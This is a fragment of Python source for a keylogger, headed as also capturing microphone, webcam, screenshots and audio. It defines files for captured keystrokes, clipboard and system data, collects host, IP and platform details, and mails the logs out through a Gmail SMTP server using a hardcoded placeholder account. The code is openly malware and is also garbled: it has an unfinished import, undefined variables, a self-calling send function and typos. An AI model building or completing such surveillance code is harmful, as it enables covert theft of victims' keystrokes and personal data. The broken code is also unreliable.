"""
Program: KeyLogger (with Microphone, WebCamera, Screenshots, Audio Logging Feature)
Author: Sushilkumar Yadav
Date: 05/08/2022
"""

# Libraries
from email.mime.multipart import MIMEMultipart
from email import encoders
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wav


# Global Variables
keys_info = "key_log.txt"
system_info = "syseminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
webCamShot_info = "webCamera.png"

keys_info_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "example@domain.com" # Enter disposable email here
password = "myPa55w0rd" # Enter email password here
extend = "\\"
file_merge = file_path + extend


# Send Email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

    send_email(keys_info, file_path + extend + keys_info, toaddr)

# Get System Information
def system_information():
    with open(file_merge + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (May be due to max query) \n")

        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
        f.write("system_info: " + platfrom.system() + " " + platfrom.version() '\n')

system_information()
